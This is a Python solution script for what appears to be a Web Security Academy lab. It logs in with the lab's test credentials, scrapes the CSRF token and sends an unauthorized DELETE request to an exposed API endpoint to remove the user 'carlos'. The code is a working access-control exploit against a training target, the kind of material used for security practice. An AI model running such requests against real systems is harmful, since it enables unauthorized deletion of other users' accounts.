'''
To solve the lab, find the exposed API documentation and delete carlos. You can log in to your own account using the following credentials: wiener:peter. 
'''

import requests
from bs4 import BeautifulSoup

proxies = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
}

url = "https://0a25009303a8b2ff841b32de00bd002f.web-security-academy.net"

s = requests.Session()
s.proxies.update(proxies)
s.verify = False

# get api docs
r = s.get(f"{url}/api")

# login with wiener:peter

r = s.get(f"{url}/login")
soup = BeautifulSoup(r.text)
csrf = soup.find('input', {'name':'csrf'})['value']

payload = {
    'csrf':csrf,
    'username':'wiener',
    'password':'peter'
}

s.post(f"{url}/login", data=payload)

# delete carlos
r = s.delete(f"{url}/api/user/carlos")
print(r.json())